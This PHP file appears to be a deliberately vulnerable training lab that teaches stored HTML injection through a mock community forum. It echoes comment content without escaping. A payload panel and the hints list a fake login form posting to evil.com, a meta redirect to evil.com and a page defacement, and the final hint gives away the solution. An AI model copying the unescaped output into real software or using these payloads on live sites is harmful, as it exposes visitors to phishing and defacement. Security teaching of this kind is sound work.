<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['HTML-Injection']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['html_case3_attempts'])) {
  $_SESSION['html_case3_attempts'] = 0;
}
if (!isset($_SESSION['html_case3_solved'])) {
  $_SESSION['html_case3_solved'] = false;
}

// ─── Simulated Stored Comments ───────────────────────────────────────────
$stored_comments = [
  ['id' => 1, 'author' => 'admin', 'avatar' => 'A', 'content' => 'Welcome to the DarkHunter community! Share your thoughts and questions here.', 'time' => '2026-05-22 06:00:00', 'likes' => 42],
  ['id' => 2, 'author' => 'security_expert', 'avatar' => 'S', 'content' => 'Great platform for learning web security. The labs are very realistic!', 'time' => '2026-05-22 05:30:00', 'likes' => 28],
  ['id' => 3, 'author' => 'newbie_hacker', 'avatar' => 'N', 'content' => 'Just completed my first XSS lab. Can\'t wait to try the advanced ones!', 'time' => '2026-05-22 04:15:00', 'likes' => 15],
];

// ─── Handle New Comment Submission ───────────────────────────────────────
$comment_submitted = false;
$html_injected = false;
$flag_triggered = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_comment'])) {
  $author = $_POST['author'] ?? 'Anonymous';
  $content = $_POST['content'] ?? '';

  // VULNERABLE: Content stored without sanitization
  // In a real app, this would be saved to database
  $new_comment = [
    'id' => count($stored_comments) + 1,
    'author' => $author,
    'avatar' => strtoupper(substr($author, 0, 1)),
    'content' => $content, // NO htmlspecialchars() - stored as-is!
    'time' => date('Y-m-d H:i:s'),
    'likes' => 0,
  ];

  // Check for HTML injection in stored content
  if (preg_match('/<[a-zA-Z][^>]*>/', $content)) {
    $html_injected = true;

    // Check for flag-triggering payloads
    if (preg_match('/<(h1|h2|h3|script|iframe|form|input|button|marquee|blink|div|span|a|img)\s*[^>]*>/i', $content)) {
      $flag_triggered = true;
    }
  }

  $stored_comments[] = $new_comment;
  $comment_submitted = true;
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['html_case3_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['html_case3_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['html_case3_solved'] = true;
  $already_solved = true;
  $success_msg = "Outstanding! You've successfully exploited a Stored (Persistent) HTML Injection vulnerability. Your malicious HTML was saved to the database and rendered for all visitors, demonstrating the severe impact of persistent injection attacks!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_comment'])) {
  $_SESSION['html_case3_attempts']++;
}

$attempts = $_SESSION['html_case3_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Community Forum - HTML Injection Case 3 (Stored)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/HTML-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to HTML Injection Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-comments"></i> DarkHunter Community Forum</h1>
      <p class="lab-description">Join the discussion and share your cybersecurity journey. This medium-difficulty HTML
        Injection challenge stores user comments permanently. <strong>No input sanitization on storage!</strong> Your
        injected HTML will persist and affect all visitors.</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this Stored HTML Injection vulnerability. You can continue exploring, but no
          additional points will be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Forum Grid -->
    <div class="forum-grid">

      <!-- Comment Form (Vulnerable) -->
      <div class="forum-card comment-form-card">
        <div class="card-header">
          <i class="fas fa-pen"></i>
          <h3>Post a Comment</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> No Sanitization</span>
        </div>

        <?php if ($comment_submitted): ?>
        <div class="submit-alert">
          <i class="fas fa-check-circle"></i>
          <span>Comment posted successfully! Visible to all visitors.</span>
        </div>
        <?php endif; ?>

        <form method="POST" action="" class="comment-form" id="comment-form">
          <input type="hidden" name="submit_comment" value="1">

          <div class="form-group">
            <label><i class="fas fa-user"></i> Your Name</label>
            <input type="text" name="author" placeholder="Enter your name..." class="form-input" required>
          </div>

          <div class="form-group">
            <label><i class="fas fa-comment"></i> Comment</label>
            <textarea name="content" rows="4" placeholder="Share your thoughts..." class="form-textarea"
              required></textarea>
          </div>

          <button type="submit" class="btn-submit">
            <i class="fas fa-paper-plane"></i> Post Comment
          </button>
        </form>

        <div class="form-warning">
          <i class="fas fa-exclamation-triangle"></i>
          <span>Comments are stored permanently and displayed without filtering!</span>
        </div>
      </div>

      <!-- Comments List -->
      <div class="forum-card comments-card">
        <div class="card-header">
          <i class="fas fa-comments"></i>
          <h3>Community Comments</h3>
          <span class="comment-count"><?php echo count($stored_comments); ?> comments</span>
        </div>

        <div class="comments-list">
          <?php foreach ($stored_comments as $comment): ?>
          <div class="comment-item">
            <div class="comment-avatar">
              <?php echo $comment['avatar']; ?>
            </div>
            <div class="comment-body">
              <div class="comment-header">
                <span class="comment-author"><?php echo htmlspecialchars($comment['author']); ?></span>
                <span class="comment-time">
                  <i class="fas fa-clock"></i> <?php echo $comment['time']; ?>
                </span>
              </div>
              <!-- VULNERABLE: Content rendered without htmlspecialchars() -->
              <div class="comment-content">
                <?php echo $comment['content']; ?>
              </div>
              <div class="comment-actions">
                <button class="action-btn like-btn">
                  <i class="fas fa-thumbs-up"></i> <?php echo $comment['likes']; ?>
                </button>
                <button class="action-btn reply-btn">
                  <i class="fas fa-reply"></i> Reply
                </button>
              </div>
            </div>
          </div>
          <?php endforeach; ?>
        </div>
      </div>

      <!-- Injection Impact -->
      <div class="forum-card impact-card">
        <div class="card-header">
          <i class="fas fa-bomb"></i>
          <h3>Stored Injection Impact</h3>
        </div>
        <div class="impact-content">
          <div class="impact-item">
            <i class="fas fa-users"></i>
            <div class="impact-text">
              <strong>Affects All Visitors</strong>
              <span>Every user who loads this page will see your injected HTML.</span>
            </div>
          </div>
          <div class="impact-item">
            <i class="fas fa-infinity"></i>
            <div class="impact-text">
              <strong>Persistent Attack</strong>
              <span>The injection survives page reloads and browser sessions.</span>
            </div>
          </div>
          <div class="impact-item">
            <i class="fas fa-user-secret"></i>
            <div class="impact-text">
              <strong>No User Interaction Needed</strong>
              <span>Unlike reflected XSS, victims don't need to click a link.</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Payload Ideas -->
      <div class="forum-card payloads-card">
        <div class="card-header">
          <i class="fas fa-lightbulb"></i>
          <h3>Stored Injection Ideas</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Fake Login Form</div>
            <code
              class="payload-code">&lt;form action="https://evil.com"&gt;&lt;h3&gt;Please Login&lt;/h3&gt;&lt;input placeholder="Password" type="password"&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-name">Redirect Meta Tag</div>
            <code class="payload-code">&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-name">Defacement</div>
            <code
              class="payload-code">&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999"&gt;&lt;h1&gt;HACKED&lt;/h1&gt;&lt;/div&gt;</code>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Comments Stored: <?php echo count($stored_comments); ?></span>
          <span>HTML Injected: <?php echo $html_injected ? 'YES' : 'NO'; ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">This is a <strong>stored</strong> HTML injection - your comment is saved and displayed to
        everyone. Try posting a comment with HTML tags like <code>&lt;h1&gt;Test&lt;/h1&gt;</code> and notice how it
        renders as real HTML.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">Since the injection is persistent, you can create more impactful payloads. Try injecting a
        fake login form, a defacement div, or a meta refresh redirect. The key difference from reflected injection is
        that ALL visitors will see your payload.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Post a comment containing any HTML tag to trigger the flag. A simple payload like
        <code>&lt;h1 style="color:red"&gt;PWNED&lt;/h1&gt;</code> or
        <code>&lt;div style="background:black;color:lime;padding:10px"&gt;HACKED BY HTML INJECTION&lt;/div&gt;</code>
        will solve the challenge. The injection must contain actual HTML tags (not just text).
      </div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  window.addEventListener('load', function() {
    const injectionAlert = document.querySelector('.submit-alert');
    const alreadySolved = document.querySelector('.solved-banner');

    // Check if HTML was injected in the latest comment
    const comments = document.querySelectorAll('.comment-content');
    let hasHtml = false;
    comments.forEach(c => {
      if (c.innerHTML !== c.textContent) {
        hasHtml = true;
      }
    });

    if (hasHtml && !alreadySolved) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>